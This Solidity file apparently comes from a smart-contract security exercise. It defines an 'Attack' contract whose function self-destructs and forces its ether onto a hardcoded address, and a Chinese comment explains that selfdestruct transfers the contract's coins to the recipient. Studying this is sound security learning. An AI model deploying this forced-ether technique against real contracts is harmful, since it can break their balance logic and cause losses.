// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


contract Attack {

    function attack() public payable {
        
        address payable to = payable(address(0xc3EDccC594c398A641eEDCAfbecF57757DA587F7));
        selfdestruct(to);
    }

}

/**
 * selfdesturct销毁合约会把合约里的币转去目标接收者
 */